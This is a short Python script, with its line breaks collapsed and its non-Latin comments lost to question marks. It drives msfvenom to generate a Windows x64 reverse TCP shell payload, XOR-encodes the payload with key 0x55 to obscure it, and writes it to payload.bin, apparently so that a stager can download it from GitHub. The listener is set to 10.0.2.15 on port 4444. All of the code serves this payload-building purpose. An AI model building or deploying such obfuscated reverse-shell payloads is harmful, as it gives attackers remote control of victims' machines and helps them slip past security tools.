import subprocessimport sysdef generate_payload(lhost, lport):    print(f"[*] Generating x64 Reverse TCP payload for {lhost}:{lport}...")        # ??????? msfvenom ?????? ?????? ??? (Raw) ???? ?? x64    msf_cmd = [        "msfvenom",        "-p", "windows/x64/shell_reverse_tcp",        f"LHOST={lhost}",        f"LPORT={lport}",        "-f", "raw"    ]        try:        result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)        raw_shellcode = result.stdout    except FileNotFoundError:        print("[-] Error: msfvenom is not installed or not in PATH. Please provide raw shellcode manually.")        sys.exit(1)    except subprocess.CalledProcessError as e:        print(f"[-] msfvenom failed: {e.stderr.decode()}")        sys.exit(1)    print(f"[+] Raw payload generated successfully. Size: {len(raw_shellcode)} bytes")    # ????? ????? XOR 0x55 ??????? ?? ??? Stager    key = 0x55    encrypted_payload = bytes([b ^ key for b in raw_shellcode])    # ??? ?????? ?? ??? payload.bin ????? ??? GitHub    with open("payload.bin", "wb") as f:        f.write(encrypted_payload)    print(f"[+] Encrypted payload.bin (XOR 0x55) generated successfully! Size: {len(encrypted_payload)} bytes")if __name__ == "__main__":    # ?????? ????? ??? IP ??????? ??? ????? ?????? ??? Listener ????? ?? (????? Netcat ?? Metasploit Handler)    LHOST = "10.0.2.15"  # ?? ??? ????? ??? IP ????? ???????? (Listener)    LPORT = "4444"       # ?? ??? ??? ?????? (Port)        generate_payload(LHOST, LPORT)